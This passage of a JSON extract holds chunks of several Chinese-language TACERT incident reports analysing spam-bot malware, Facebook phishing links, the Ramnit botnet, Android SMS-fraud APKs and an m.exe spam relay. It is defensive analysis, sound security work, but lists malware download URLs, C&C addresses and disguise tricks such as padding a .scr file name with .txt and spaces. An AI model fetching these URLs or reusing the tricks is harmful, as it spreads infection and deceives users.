        "content": "C 連入做控制。 4. 在檢查父程式transcript.txt.scr 的連線狀態,可以看到有大量的對外 連線和流量,檢查以下連線IP 幾乎都是搜尋引擎網站。 5. 除此之外還觀察到惡意程式transcript.txt.scr 除了會連到搜尋引擎 網站,還會產生大量對外port 25 的連線,可能是正在對外發送SPAM 郵 件。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 6. 從封包內容來檢視,transcript.txt 連到的port 80 幾乎都是各大家的 搜尋引擎,並且大量搜尋可用的電子郵件網域,並且開始準備發送SPAM。 7. 檢查其中一比較完整的SPAM 封包紀錄,得知惡意程式會偽造發信人地 址,並且發送給搜尋到的domain 為163.com 收件者,通常會夾帶惡意檔 案。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 8. 檢查惡意程式發送較多的網域是 aol.com 的郵件來看,其內容格式來看 與本事件收到的郵件內容相符,表示其不算是APT 攻擊,只是亂槍打鳥方 式的SPAM 惡意郵件。 9. 惡意程式Transcript.txt.scr 在大量向搜尋引擎查詢domain 資料後, Google 的網站會開始進行存取封鎖,因為有異常大量連線的偵測機制。  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 10. 從本次測試一周期間統計出,至少有對外部相異2000 個email 位址發 送SPAM 攻擊,以國別來說也有59 個國家受害。發送SPAM 期間也會消耗 大量網路頻寬而可能造成網路壅塞。 11. 最後將惡意程式樣本 transcript.txt.scr 送到Virustotal 檢測,檢 測為惡意的比例為 58/60 相當明顯,但也是有知名防毒廠商尚未檢測出。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 12. 另一支程式 services.exe 透過Virustotal 檢測,檢出比例",
        "Page_Num": "4,5,6,7,8"
    },
    "396": {
        "File_Name": "個案分析-帶有惡意程式的垃圾郵件SPAM攻擊事件分析報告_10605.pdf",
        "content": "為 58/61 相當高,不過依然還是有知名防毒廠商尚未檢測出。 III. 網路架構圖 受害者主機 SPAM 郵件 SCR 惡意檔案 遭受SPAM攻擊受害者 駭客 STEP 1 感染惡意程式 各大搜尋引擎 Google、Lycos、Yahoo... STEP 4 透過 port 1034 後門連入 STEP 3 大量發送SPAM STEP 2 查找大量 email STEP 5 感染者會再發送 SPAM給其他人 1. 受害者開啟SPAM 郵件中的附加檔案,為偽造成TXT 的SCR 惡意程式。 2. 受害主機會開始向外部的各大搜尋網站查找可用的郵件網域名稱。 3. 受害主機開始向搜尋到的mail 位址發送大量的惡意SPAM。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 4. 駭客C&C 可能透過port 1034 連入感染主機,並下達其他攻擊指令。 5. 當新的受害者也感染惡意檔案後,也會開始對外發送SPAM 郵件並成為新的 Botnet。 IV. 建議與總結 1. 此案例為惡意SPAM 郵件攻擊,並附加偽造成TXT 文件檔的SCR 執行檔惡意程 式。 2. 該惡意程式在副檔名SCR 前塞入.TXT 和冗長的空白字元進行偽裝,一旦執行 後會開啟port 1034 為Listen 狀態。 3. 惡意程式SPAM 攻擊之前會大量向搜尋網站查找可攻擊的電子郵件網域,並且 再對外進行port 25 的SPAM 郵件攻擊。 4. SPAM 郵件有可能會偽造寄件者的郵件地址為相同網域的地址,增加後害者上 當的機率。 5. 該事件受害者同時也會成為攻擊其他人的加害者,並且成為殭屍網路的主機 讓駭客使用。 6. 所幸該惡意程式並不會寫入開機自動啟動區,當使用者重開主機後網路攻擊 行為就不會再出現。 7. 此類型的社交工程郵件近年來一直很多,有的惡意程式多為加密勒索軟體, 更應提高警覺避免誤觸。 ",
        "Page_Num": "8,9"
    },
    "397": {
        "File_Name": "個案分析-常見於Facebook上的惡意連結網址_10312.pdf",
        "content": "1 個案分析- 常見於Facebook 上的惡 意連結網址事件分析報告 TACERT 臺灣學術網路危機處理中心團隊製 2014/12  2 I. 事件簡介 A. 現今Facebook(簡稱FB)已經成為社會大眾主要的社群交友的網路平台, 透過FB 可以訂閱追蹤喜歡的人事物資訊,或者用來與朋友進行溝通傳遞 訊息,然而可能也成為駭客利用社交工程入侵的一種方式。 B. 本個案利用FB 進行社交工程的案例有兩件,分別為事件A 和事件B。 C. 事件A 為近期發現到FB 上某些人會非自主性的散佈特殊主題的惡意連結 誘使朋友去開啟,並且引導下載惡意程式安裝。 1. 此例為FB 的朋友會在他人的發表文章底下回覆「Select your favorite color scheme for Facebook layout.」,並提供假的APP 連結與縮圖供使用者去開啟。 D. 事件B 為FB 聯絡人在受害者版上發表惡意APP 連結,內容包含FB 釣魚 網頁連結,藉以竊取FB 帳號密碼。 II. 事件A 檢測 A. 嘗試點入該“Facebook color changer”的連結後,其會自動轉跳至另 一網址「http://bagsngdkkam.us/color.php」,並且出現驚悚血腥的圖  3 片及影片連結吸引使用者去觀看,並且底下還有回覆讓人更容易去開 啟。 B. 當使用者想去觀看開啟該影片時,畫面中的PLAY 圖示上會多出「Share this video before watching.」「Share On Facebook」的字樣,提醒使 用者觀看前必須分享該訊息至個人FB 動態上。  4 C. 當使用者點擊了確定分享之後,該連結就會自動發布在FB 個人動態上, 進而讓更多朋友去開啟。 D. 此時網頁並不會立刻撥放該影片,而會轉跳至新的頁面要求下載制式的 影片撥放器才能觀看,誘使用戶下載該惡意程式並安裝。 1. 檢查原始碼得知會去 GET /mermaid/redirect.php 後,轉址至 www.sofotiprojects.com 的網站底下。  5 E. 當嘗試點擊連結後會開始下載一個名為 VideoPerformerS",
        "Page_Num": "1,2,3,4,5"
    },
    "398": {
        "File_Name": "個案分析-常見於Facebook上的惡意連結網址_10312.pdf",
        "content": "etup.exe 的執 行檔案,先將該檔案透過Virustotal 線上掃毒,偵測比例為8 / 53 的 惡意程式。  6 F. 透過封包側錄可以看到當程式VideoPerformerSetup.exe 在執行安裝時 候,會產生一些對外的網路連線,主要會連到英國IP 94.31.29.3、美 國IP 174.36.241.171 和美國IP 50.22.175.76。 1. 該程式執行時候會去向網站cdn.appdint.com 進行下載惡意軟體 SearchShock.exe 執行,此網站IP 就是94.31.29.3。 2. SearchShock.exe 安裝後會綁架瀏覽器的首頁,強制改成他的搜尋引 擎列,以監控瀏覽器的紀錄或登入密碼。 3. 除了SearchShock.exe 之外,惡意程式還會下載安裝其他檔案,如 「ZulaGamesSetupW.exe、UnknownFile.exe、PCPerformerSetup- 4.exe、CloudBackup.exe」,這些軟體皆未經由使用者授權就直接安 裝,可能會占用主機資源拖慢速度或竊取資料等。  7 4. 如PC PERFORMER 看起來是一個系統的修復軟體,事實上剛好相反而 會占用主機資源或竄改主機設定。 5. 如 MyPC Backup 則會在背景消耗大量的記憶體資源托慢系統速度。 6. 而安裝過程中會將主機的相關資訊透過 HTTP POST 方式上傳到 api.ibario.com,也就是IP 為174.36.241.171 和50.22.175.76, 駭客可能利用 Fast Flux 方式動態切換網域名稱對應的IP。  8 a. 透過Virustotal 檢測該網站api.ibario.com 的確有被偵測出為 惡意網址,比例是 2/61 。 b. 檢視上傳到api.ibario.com 的封包檔,可以看到報到的路徑是 “POST /events”,而內容有標註 timestamp、action、 custom、Country 等主機資訊,其中custom 內文為base64 編 碼,解碼後為 「{\"installer_id\":\"603\",\"installer_",
        "Page_Num": "5,6,7,8"
    },
    "399": {
        "File_Name": "個案分析-常見於Facebook上的惡意連結網址_10312.pdf",
        "content": "version\":\"14.8.7.1\",\"v a\":\"-1\",\"sver\":\"1.0.0.1\"}」,也就是安裝的編號和版本號碼。  9 III. 事件B 檢測 A. 事件B 中,某FB 聯絡人向受害者發表一張照片,告知是透過特定APP 能 將生活照轉換成可愛卡通照片,讓使用者去打開附上的連結頁面。 B. 當使用者開啟該頁面後,網頁會轉跳至一個FB 的名為「Tin Hot 24」社 區專頁,此頁面會去執行一些指令碼,故IE 視窗會跳出詢問是否要停止 視窗指令碼的訊息。  10 C. 此頁面出現時間很短,不管有無點選「是」或「否」都會在轉跳至另一 個網頁,也就是要求重新登入Facebook 的畫面,此頁面網址為 「appvuifacebook.com」的釣魚網頁。 D. 嘗試輸入帳號「whoami@hotmail.com」和密碼「P@ssw0rd」測試,檢查 側錄的封包的確有看到該帳號密碼以HTTP POST 明文方式送出,確實為 惡意的釣魚網頁。 1. 釣魚網頁「appvuifacebook.com」的IP 為「119.81.52.56」,是位於 中國河北省廊坊市的主機。  11 IV. 網路架構圖 FB使用者 事件 A: STEP 1 : 使用者開啟FB上他人發文的惡意程式連結。 STEP 2 : 轉址至「www.sofotiprojects.com」 並下載惡意程式 「VideoPerformerSetup.exe」。 事件 B: STEP 1 : 使用者開啟FB聯絡人傳來的惡意連結。 STEP 2 : 轉址至偽造的FB登入頁面「appvuifacebook.com」 www.sofotiprojects.com STEP 1 開啟FB上惡意連結 Facebook FB使用者 FB釣魚網站 Facebook STEP 2 下載惡意程式 事件 A 事件 B STEP 1 FB聯絡人傳送 惡意連結 STEP 2 偽造的FB登入頁面 V. 建議與總結 A. 此案例都是經由社交網站Facebook 進行的攻擊行為,透過聯絡人的信任 關係來傳送惡意程式連結或釣魚網站。  12 B",
        "Page_Num": "8,9,10,11,12"
    },
    "400": {
        "File_Name": "個案分析-常見於Facebook上的惡意連結網址_10312.pdf",
        "content": ". 事件A 的聯絡人在自己動態頁面上以留言方式發表惡意的APP 網址 (change color),讓有興趣的人去開啟安裝。 C. 事件B 的聯絡人直接在受害者的個人動態留言或私下傳訊息,內容為含 有釣魚網站位址,讓受害者登入偽造的FB 網站以竊取帳號密碼。 D. 這兩個事件共通點為發送惡意連結者可能都不是故意,因為帳號被盜取 或者安裝到能夠存取FB 權限的APP,自動發送惡意訊息。 E. 事件A 中受感染者就會在自己的動態上發布惡意網址,表示惡意程式能 夠具有自動存取發布FB 的權限。 F. 建議開啟FB 的二次驗證功能,於FB 的安全性設定可以啟用代碼產生 器,就算駭客竊取到了帳號密碼還必須輸入時效性代碼方能登入,能有 效防範駭客入侵。 G. FB 上的簡訊或留言中的網站連結在開啟前都要特別注意,很有可能為惡 意程式連結或釣魚網站。 ",
        "Page_Num": "12"
    },
    "401": {
        "File_Name": "個案分析-常見的Ramnit殭屍網路病毒分析報告_10511.pdf",
        "content": "個案分析- 常見的Ramnit 殭屍網路病 毒事件分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 2016/11  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team I. 事件簡介 1. 殭屍網路主機一直是駭客最有利的攻擊利器,因為駭客組織透過這些殭屍 們,就能對特定網路造成大量的DDoS 攻擊,造成許多網路服務被迫中斷。 2. Ramnit 蠕蟲病毒在今年初中華電信公布的台灣資安威脅排名中位居第 一,讓許多主機淪陷成為肉雞而不自知。 3. 本單位取得其中一個Ramnit 的病毒樣本進行測試,並透過其網路行為進 行分析。 II. 事件檢測 1. 使用VM 虛擬主機並且為Windows 7 (X64)系統進行隔離環境測試,惡意 程式樣本名稱為 「ramnit_unpacked」的執行檔。 2. 該惡意程式的圖案以 Windows Media Player 作為Logo 顯示,企圖混淆 使用者認知。 3. 測試前先透過Virustotal 掃描,比例為 42/56 的木馬或ramnit 的惡意 程式。  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 4. 在實際測試執行後,該惡意程式為了感染系統內部的檔案及取得一些控制 權限,會強制將主機系統重新開機。 5. 檢查使用者帳戶控制設定的等級後發現,安全性等級已經被調整至最低等 級。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 6. 因為確保重開機後惡意程式還會繼續作用,故一定會有自動開機啟用的寫 入,透過 autoruns 檢查的確有多出幾項未知的註冊機碼。 7. ramnit_unpacked.exe 會分別在系統暫存的隱藏資料夾中建立 xmdxphar.exe 和 hiudwtgu.exe,而該兩支檔案virustotal 查看都是 ramnit_unpacked.exe 的複本。 8. 接著在背景程式中會多出兩支異常的 svchost.exe 在執行,事實上原本 的惡意程式將系統 ",
        "Page_Num": "1,2,3,4"
    },
    "402": {
        "File_Name": "個案分析-常見的Ramnit殭屍網路病毒分析報告_10511.pdf",
        "content": "\\system32 底下的 svchost.exe 進行感染病操控,並 且有大量對外的網路行為產生。 9. 經過測試將該 svchost.exe 程序kill 之後,很快就又建立一個新的 svchost.exe 程序,因此觀察到 ~\\temp\\hiudwtgu.exe (1856)這支程式  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 專門去執行 svchost.exe 的惡意程序(3184)。 10. 因此若要手動排除感染檔案,不能移除系統內建的 svchost.exe,而是 要針對 xmdxphar.exe 和 hiudwtgu.exe 的惡意程式主體進行移除,才能 防止再啟動惡意程序。 11. 檢查svchost.exe 產生的網路行為都是連到外部主機的port 80 和 443,其中port 443 的主機經過測試大多已經沒回應。初步判定惡意程式 的行為目的應該是產生大量的HTTP(S)連線降低網站服務效能。 12. 另外連到port 80 的主機大多是 google 的 cache 伺服器,包含了學 術網路內的快取伺服器,並且都是發送 300 Bytes 左右的無內容封包。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 13. 一般主機成為殭屍電腦後應該都會留有一個port 來接收C&C 指令,然 而在測試過程中尚未明顯的大量流量。不過在此正常的系統開啟的port 中,有記錄到疑似C&C 連入的封包。 14. 從此封包紀錄得知,確實有外部IP 中國 60.205.170.187 連入到感染 主機的port 135,而該port 是由系統的svchost.exe 控制,故若惡意程 式能控制svchost.exe 也是有可能被用接收指令。封包內容包含了一些加 密字串以及主機名稱和IP 資訊。  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team III. 網路架構圖 China C&C 60.205.170.187 殭屍主機 Svchost 感染 Ramnit 惡意程式 駭客 STEP 1 ",
        "Page_Num": "4,5,6,7"
    },
    "403": {
        "File_Name": "個案分析-常見的Ramnit殭屍網路病毒分析報告_10511.pdf",
        "content": "感染惡意程式 Google 快取主機群 Port 80、443 STEP 2 大量建立TCP連線 STEP 3 Port 135 加密連入 SPAM mail 監控網站 被DDoS攻擊 主機 STEP 4 接受C&C指令發動 攻擊 1. 使用者可能透過SPAM 郵件開啟含有惡意程式ramnit 的檔案。 2. 主機感染惡意程式後不斷地向google 快取伺服器建立連線。 3. 疑似中國C&C 透過系統port 135 漏洞連入主機下達指令。 4. 必要時候駭客透過C&C 下達攻擊指令對外部主機進行DDoS 攻擊。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team IV. 建議與總結 1. 使用者可能透過被SPAM 或APT 攻擊執行到惡意程式而遭受感染成為 ramnit 殭屍主機。 2. 此惡意程式會感染系統的檔案svchost.exe 並透過他進行網路連線。 3. 駭客能透過系統svchost 預設開啟的port 135 下達C&C 指令,不容易被 發現。 4. 雖然嘗試將有有問題的svchost 程序關閉,依然會被惡意程式恢復執行, 但是卻不能刪除系統檔案svchost。 5. 惡意程式會寫入開機自動啟用,故透過啟用路徑刪除真正的檔案 xmdxphar.exe 和 hiudwtgu.exe 後,在關閉問題程序svchost 就能排除問 題。 6. 此類病毒會控制使用者權限並感染系統程式,不容易從程式管理工具中發 現移除。 7. 此Ramnit 相關連結如下: 1. 中華電信揭露臺灣20 大惡意程式:Ramnit 蠕蟲最兇單日攻擊3 萬件 http://www.ithome.com.tw/news/104775 2. Ramnit 殭屍網絡在香港的偵測及清理 https://www.hkcert.org/my_url/zh/blog/15062601 V. 國外報導 1. Ramnit Rears Its Ugly Head Again, Targets Major UK Banks a. IBM X-Force 的研究人員最近報告說,Ramnit 木馬已經重新啟動, 針對英國的六大銀行。 b.",
        "Page_Num": "7,8"
    },
    "404": {
        "File_Name": "個案分析-常見的Ramnit殭屍網路病毒分析報告_10511.pdf",
        "content": "大約八個月沉默期後,研究人員觀察到Ramnit 的開發者成立了兩 個新的活躍的攻擊服務器和一個新的命令與控制(C&C)服務器。 c. 他們在英國開發新的木馬配置方式並且蔓延,透過網站置入去感染 以獲得使用者銀行帳戶資料。 d. https://securityintelligence.com/ramnit-rears-its-ugly-he  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team ad-again-targets-major-uk-banks/ 2. Ramnit Malware Back and Better at Avoiding Detection a. The Ramnit malware family has been given a facelift with new anti-detection capabilities, a troubleshooting module, as well as enhanced encryption and malicious payloads. b. Ramnit was detected in 2010 and has been proficient in stealing credentials, focusing primarily on online bank accounts, FTP log-ins and even Facebook passwords. c. https://wp.me/p3AjUX-kc8 ",
        "Page_Num": "8,9"
    },
    "405": {
        "File_Name": "個案分析-常見的手機簡訊病毒詐騙事件分析報告_10308.pdf",
        "content": "1 個案分析- 常見的手機簡訊病毒詐騙 事件事件分析報告 TACERT 臺灣學術網路危機處理中心團隊製 2014/08  2 I. 事件簡介 A. 近年來智慧型手機的簡訊詐騙越來越多樣化,從早期的電話通知中獎或分 期轉帳詐騙,進化成智慧型手機的簡訊詐騙,駭客主要利用手機網路方式 誘使用戶下載安裝惡意木馬程式,以控制裝置的權限進行財務盜竊,然大 多用戶無資訊安全觀念而容易受害。 B. 目前詐騙主流多為Android系統的智慧型手機,因為APP的安裝限制較少, 手機取得Root 的方式也較為容易,第三方的ROM 或APP 安裝檔網路上都 能輕易下載安裝,但往往成為資訊安全的漏洞。 C. 這次事件主要將常見的詐騙簡訊實地安裝測試,側錄其封包並觀察可能產 生的系統網路行為。 1. 事件A: 今年3 月底手機收到SMS 文字簡訊告知用戶說,「貴用戶有申請網路繳 費通知,非本人操作請依照指示點擊所附連結進行取消。」連結為 http://goo.gl/UB9zBa,該號碼為中華電信的門號 0921124XXX。 左圖:事件A 2. 事件B: 今年4 月初手機收到SMS 文字簡訊告知用戶說,「您的快遞通知,收件 簽收憑證。」連結為 http://goo.gl/gj1LSq,該號碼為中華電信的門 號 0988220XXX。  3 左圖:事件B 3. 一般對於較沒網路資訊安全概念的使用者就容易依照指示開啟連結, 就如同早期ATM 取消分期轉帳的詐欺手法,利用人性對於害怕金錢損 失的弱點進行攻擊。 4. 這類詐騙簡訊通常有個共同現象,就是會附帶惡意連結並要求用戶下 載憑證並安裝。 5. 另外連結位址習慣使用google 或其他的縮短址將真正網址進行遮蔽 (http://goo.gl/),讓使用者不容易察覺真正網址,還能透過google 的縮短址管理介面得知有多少用戶點擊過,以方便駭客統計。 II. 事件A 測試 1. 在事件A,我們透過Android 的模擬器Genymotion ",
        "Page_Num": "1,2,3"
    },
    "406": {
        "File_Name": "個案分析-常見的手機簡訊病毒詐騙事件分析報告_10308.pdf",
        "content": "進行測試,使用OS 4.3 的版本。開啟該連結後會轉到真正的網址IP「203.69.59.153」, 並下載一個名為『通知單.apk』的Andorid APP 安裝檔。  4 2. 對方主機IP 位址經過調查發現是中華電信的固定制IP,研判可能被 駭客入侵植入後門程式當作跳板。 3. 實地安裝該APK 檔之後,出現一個介面顯示是否要確認或取消此網上 支付交易的選項。 4. 若選擇「確認交易」則會出現「交易已失敗」,若「取消交易」則會出 現「交易已取消」的訊息。然而無論是選擇哪個項目,後門程式已成 功植入系統再背景執行,顯示字串只是誤導使用者安裝認為失敗。 a. 我們注意到該惡意程式會仿造Google 的LOGO,且APP 名稱為 「Google Service」,讓使用者誤以為是系統內建程式。  5 左圖:選擇確認交易 右圖:選擇取消交易 5. 檢查側錄的封包資訊發現,該Google Service 的APP 會持續向IP 203.69.59.153進行連線,而該IP經由檢查發現是HINET的固定制IP, 而該主機有開啟遠端桌面的服務,研判是被駭客入侵當作中繼站跳板。 a. 從封包得知惡意程式主要是透過HTTP GET 不斷向中繼站傳送感染 主機資訊,主要是以「GET /dong/ SMSHandler.ashx?xxx...」將資 訊以參數方式送出,從控制檔SMSHandler.ashx 可以推斷惡意程式 能夠存取簡訊的控制權限。 b. 下圖封包分析可以看出參數中帶有手機型號「HTC ONE」、OS 版本 為4.3 及解析度「1080x1920」等資訊。故手機內部的簡訊內容應 該就是以此方式被駭客竊取,以控制受害人的設備。  6 6. 透過APKTOOL 反組譯工具去解析「通知單.apk」後得到 AndroidManifest.xml,裡面宣告了該APP 能夠使用的權限,其中包括 了「讀取手機狀態、發送簡訊、讀取簡訊",
        "Page_Num": "3,4,5,6"
    },
    "407": {
        "File_Name": "個案分析-常見的手機簡訊病毒詐騙事件分析報告_10308.pdf",
        "content": "、編寫簡訊、接收簡訊、INTERNET 啟用、撥打電話、讀取聯絡人資訊以及記憶卡寫入權限」,這些權限嚴 重影響使用者的個資安全,甚至會有金錢損失。 7. 從Virustotal 檢測得知病毒偵測比率為9/51,主要的惡意行為是完 全控制SMS 簡訊功能,同樣檔案的其他別名有「oldboot.b.apk、通知 單6.apk、vti-rescan、通知單.apk、1.apk」。  7 III. 事件B 測試 1. 在事件B 中,開啟簡訊連結http://goo.gl/gj1LSq 後會轉址至 Dropbox 的免費空間,並出現檔案「電子表單.apk」的下載頁面,這 些免費空間儼然容易成為駭客存放惡意程式的一個工具。 a. 使用Dropbox 的好處是容易申請,而且檔案可以直接分享連結供人 下載而無須登入,就算被人檢舉關閉也能立刻重新再開立帳號,所 以駭客很喜歡使用這類免費空間。 2. 實地將該APK 檔案用Android 模擬器安裝,發現此惡意程式會檢測所 安裝的作業環境,若是模擬器的作業系統則無法正常安裝。因此我們 改用實體智慧手機進行安裝測試,結果順利安裝成功,此次使用的手 機型號為Google Nexus S 的Andorid OS 4.2 版本。安裝完後APP 的 名稱為「safeguard」且LOGO 是Google 內建的圖案。 3. 我們透過apktool 的反組譯工具去解析,發現該惡意程式APK 有做過 特殊防護,故無法成功反組譯成功。但還是能從安裝過程中知道,該  8 APP 主要能夠存取的權限有「撥打電話、簡訊所有權、通話錄音、通 話紀錄及聯絡人、記憶卡存取、網路控制權、藍芽控制及啟動執行和 控制其他應用程式」,幾乎所有重要功能都能被掌控,相當危險。 4. 檢查側錄的封包資訊發現,該「safeguard」的APP 會連到HINET 的兩 個IP 位址,分別是「61.228.129",
        "Page_Num": "6,7,8"
    },
    "408": {
        "File_Name": "個案分析-常見的手機簡訊病毒詐騙事件分析報告_10308.pdf",
        "content": ".11」和「111.249.205.230」,經過 DNS 反解析得知為「XXX.dynamic.hinet.net」,此為HINET 的動態位 址。研判應該為被入侵的受害主機中繼站。 a. 傳送的封包內容皆為加密過的內容,且都送至目的端的固定Port 9090。  9 5. 從Virustotal 檢測得知病毒偵測比率為28/53,主要功能幾乎能完全 存取手機狀態,同樣檔案的其他別名有「eForm.apk、file-6821568_apk、 電子表單.apk、ultimate.safeguard.apk」等。 IV. 事件A 與B 的比較 1. 相同點 a. 事件A 和事件B 都是透過手機簡訊進行的一種釣魚郵件攻擊,透過 相關訊息內容去誘使使用者開啟網路連結並下載惡意程式APK 檔 並安裝。 b. 兩事件相同之處就是惡意程式APP 傳送出去的資料都經過加密,且  10 APP 都能存取手機重要的權限,例如簡訊、記憶卡、聯絡人等資訊。 2. 相異點 a. 事件A 和事件B 最大的差異點是事件B 的惡意程式經過改良,已經 能夠偵測安裝的系統環境是否為虛擬機,一旦為虛擬機則無法安裝 成功,確保能竊取真正手機的資訊。 b. 在事件A駭客可能透過遠端桌面入侵HINET的一個固定IP主機後, 開啟Web Server 功能提供下載木馬病毒,很容易就被舉報撤除。 然而事件B 中,駭客改用免費的網路空間存放惡意程式,相對來說 比較難被撤除,也能讓惡意程式存活較久。 c. 事件B 的APK 檔使用防護機制因此無法直接用apktool 進行反組譯 解析,然而事件A 的就能輕易解析。 d. 事件B 的惡意程式多了事件A 沒有的權限,包含「通話錄音功能、 更改音效權限、控制讀取WIFI 狀態、讀取寫入通話紀錄、藍芽控 制、攔截且竄改播出的號碼、檢索",
        "Page_Num": "8,9,10"
    },
    "409": {
        "File_Name": "個案分析-常見的手機簡訊病毒詐騙事件分析報告_10308.pdf",
        "content": "正在執行的應用程式、掛卸載系 統的程序、關閉背景其他程式」,全都是進階權限功能,因此相對 非常危險。 3. 正常簡訊誤判為詐騙 a. 由於這類型的詐騙簡訊已經非常氾濫,導致許多人看到這樣的簡訊 就直接認定是詐騙,更有媒體指出凡是縮短址http://goo.gl/ 開頭的 都是惡意網址,其實這只是Google 提供的免費縮短址服務,依據 用途不同會有相異結果。 b. 這則短訊則被各大媒體直接報導為詐騙簡訊,其實為某電信業者所 發送的新聞推播簡訊,其網址http://goo.gl/1S90TT 的轉址其實為 http://m.match.net.tw/pc/news/2486330。  11 圖、此為翻拍網路上的截圖 圖、縮短址對應的網站新聞 c. 其實要判斷google 的縮短址所對應的真正位址可以在尾端加上一 個「+」參數,例如“http://goo.gl/1S90TT+”,則會顯示完整位址, 故真實網域 “match.net.tw” 為台哥大所擁有。 1. 此縮短址也能統計點擊的次數,方便網站管理。 2. 縮短址的好處是可以節省簡訊的顯示空間,以節省字數的費用, 同時也常被駭客用來作為詐騙工具。  12 V. 網路行為架構圖 Internet Hackers STEP 1 : 事件A和B透過SMS簡訊連結下載惡意程式APK檔案安裝。 STEP 2 : APK安裝後APP開始向上層中繼站傳送加密資料。 STEP 3 : 中繼站會將資料收集至上層C&C。 STEP 4 : 駭客從C&C主機中獲得感染手機的機密資訊。 STEP 2 密文傳送 C&C Android 模擬器 Google Nexus S 中繼站 203.69.59.153 中繼站 61.228.129.11 111.249.205.230 C&C STEP 3 傳送至C&C STEP 4 駭客取得 STEP 2 密文傳送 STEP 3 傳送至C&C STEP 4 駭客取得 STEP 1 SMS下載 「通知單.APK」 STEP",
        "Page_Num": "10,11,12"
    },
    "410": {
        "File_Name": "個案分析-常見的手機簡訊病毒詐騙事件分析報告_10308.pdf",
        "content": "1 SMS下載 「電子表單.APK」 事件A 事件B VI. 總結與建議 A. 這些事件類型都是一種透過簡訊進行釣魚詐騙的手法,且沒有特定對象, 當詐騙集團或駭客掌握了大筆民眾的手機號碼後,就有可能大量發送釣魚 簡訊。 B. 駭客通常會搭配時事新聞等訊息去引誘用戶點擊連結下載,此方式類似電 子郵件APT 攻擊方式,只是沒有針對特定對象。一旦安裝惡意APK 後可能 造成個資外洩及小額付款帳單暴增。 C. 惡意程式一直再改良進化,單純只用沙盒虛擬機可能也無法測試成功。 D. 駭客一旦可以竊取手機簡訊後,就能輕易進行相關消費的簡訊身分認證, 或者取得其他帳號的二次驗證碼進行登入。 E. 遭受感染的手機可能也會發送惡意簡訊給自己的清單聯絡人,透過朋友的 信任關係就容易上當,而成為駭客的殭屍手機或中繼站等。 F. 智慧型裝置實際上就是小型電腦,因此防毒軟體的安裝是必要的,否則遭  13 受感染可能會害人又害己。 G. 除了透過防毒軟體偵測移除病毒外,建議還原為出廠預設。 ",
        "Page_Num": "12,13"
    },
    "411": {
        "File_Name": "個案分析-惡意程式m_exe分析報告_10207.pdf",
        "content": "1 個案分析- 惡意程式m.exe 分析報告 TACERT 臺灣學術網路危機處理中心團隊製 2013/07  2 前言 通報時間: 2013-06-04 11:04:20 事件單編號: AISAC-241XX 通報機關名稱: XXXXX 國民小學 影響等級: 1 級 事件分類: INT 事件說明: 此IP(210.xx.xx.90)電腦主機向外發送廣告信 件。 事件說明 一、透過收容惡意程式資料庫網站Malc0de Database 尋找IP 210.xx.xx.90 所 感染的惡意程式為: 2013-05-21,http://audpuu5b.zeqromoj.ru/m.exe,檔圖為黃色螞蟻 。 二、將此惡意程式下載於VMware 系統執行,並側錄感染的測試VM 主機網路流量 並分析其行為,側錄時間為2013/05/31-2013/06/06,側錄檔pcap 共約 1.39GB。 三、測試VM 主機環境: 1. 作業系統:Win7 Enterprise (x64) 2. IP 位址:140.xx.xx.60 3. 未安裝系統修補套件 四、惡意程式m.exe 行為: 1. 執行m.exe 後,該程式會自行轉變為隱藏檔執行。 2. 在登錄機碼中寫入開機自動執行,名稱為SonyAgent 試圖讓人誤以為是 SONY 的相關程式,且無供應商名稱。 圖1、使用autoruns 於登錄機碼中發現m.exe 會於開機時自動執行 3. 惡意程式m.exe會去連結啟用許多系統的dll檔,以開啟網路相關服務。 位於C:\\Windows\\SysWOW64\\和C:\\Windows\\System32\\ 共有36 個dll 系統檔。  3 圖2、使用procexp 顯示惡意程式m.exe 執行中 4. 測試VM 主機被開啟的Port 及Serivce: (1).TCP Port 80:作為郵件中繼站(Mail Relay)、HTTP 中繼站(HTTP Relay) (2).UDP Port 53:作為DNS proxy server 圖3、指令netstat 顯示",
        "Page_Num": "1,2,3"
    },
    "412": {
        "File_Name": "個案分析-惡意程式m_exe分析報告_10207.pdf",
        "content": "出本機TCP port 80 和 UDP port 53 被啟用 (3).惡意程式m.exe 執行後,觀察port 和IP 的連線狀況如下,一開始 的程序會顯示m.exe,但部分會轉為Unknown 的PID=0 程序執行, 較不易被發現。異常程序都會連至外部IP 的port 80。  4 圖4、currport 的port 紀錄 5. 測試VM 主機網路架構圖: Internet Test Infected VM DNS Server 168.95.1.1 Layer 1 Zombie Bots Step1-2: DNS Query&Reply C&C or Relay Stations Infected Group Hosts: A. HTTP Realy B. DNS Proxy C: Mail Relay D: Netbios Scan Mail Receivers Step2-1: HTTP (htm, php, exe, ...) Fast-Flux Relay Layer 2 Layer 3 Step3-1: SPAM Mail Step1-1: DNS Query&Reply Step3-2: SPAM Mail Delivery Step2-2: HTTP (htm, php, exe, ...) Step2-3: unknown 圖5、紅色主機為此測試VM 主機 6. 作為DNS 代理伺服器 (DNS Poxy Server): (1).紀錄中發現很多zbots 透過此測試VM 主機去做DNS service,主 要替其他中繼站做fast-flux 網域名稱解析。 (2).測試VM 主機收到zbots 的網域名稱query 後,會轉向測試VM 主機 預設的DNS 伺服器(此例為140.117.11.1 和168.95.1.1)進行網域 名稱詢問,解析後再回覆給zbots,因此測試VM 主機也作為的DNS proxy server。 (3).至少有2145 個zbots (112 個國家)向此測試VM 主機做網域名稱詢 問,解析出的網域名稱有198 個。  5 圖6、 Zbots 向此測試VM 主機140.xx.xx.60 詢問網域名稱的IP 7. 作為HTTP 中繼站 (HTTP Relay): (1).測試VM 主機開啟port 80 來接收zbot 傳送的檔案,並中繼給下一 層中繼站的port 80,",
        "Page_Num": "3,4,5"
    },
